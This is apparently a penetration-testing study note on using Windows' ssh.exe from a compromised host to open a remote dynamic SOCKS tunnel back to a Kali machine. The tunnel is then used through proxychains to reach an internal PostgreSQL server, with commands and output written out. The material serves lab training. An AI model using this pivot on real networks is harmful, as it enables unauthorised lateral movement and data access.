
# Using `ssh.exe` on Windows
On [Windows](../../../computers/windows/README.md) machines, OpenSSH *client* has been installed by default since version 1803 and since Windows 10. OpenSSH includes `ssh.exe` `sftp.exe` `scp.exe` and other [SSH](../../../networking/protocols/SSH.md) utilities. They're all installed at `%systemdrive%\Windows\System32\OpenSSH` by default.

With the OpenSSH client, we can connect to *any kind of SSH server* (with the right credentials). The [`ssh` command](../../../CLI-tools/ssh-command.md) should have the exact same syntax. For example, to start [remote dynamic port forwarding](../SSH-tunneling/remote-dynamic-port-forwarding.md) from a Windows host to our Kali machine the command is:
```powershell
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
kali@192.168.118.4's password:
```
Then, on the Kali machine, we can update `/etc/proxychains4.conf` to use the new SOCKS socket we just created:
```bash
kali@kali:~$ tail /etc/proxychains4.conf             
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```
Just like before, with the SOCKS proxy and proxychains configured, we can run whatever commands we want from our Kali machine (as long as they can handle SOCKS protocol). The SSH remote dynamic port forwarding we initiated *on the compromised Windows host* will forward all of the traffic to whatever target machines we want (as long as it has access to them through the network).
```bash
kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres  
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.215:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.50.215:5432  ...  OK
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=# 
```

> [!Resources]
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.